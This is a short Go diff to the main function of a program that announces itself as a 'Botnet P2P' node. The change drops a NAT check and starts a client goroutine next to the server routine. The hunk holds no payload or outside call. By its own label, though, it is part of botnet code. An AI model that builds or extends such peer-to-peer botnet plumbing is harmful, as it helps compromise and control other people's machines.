@@ -8,11 +8,10 @@ import (
 )
 
 func main() {
-	log.Println("Botnet P2P booting...")
-	nat, _ := checkNAT()
 	terminate := make(chan struct{})
-	log.Printf("NAT: %t\n", nat)
+	log.Println("Botnet P2P booting...")
 	go exitHandler(terminate)
+	go clientRoutine()
 	serverRoutine(defaultPort, terminate)
 }
 
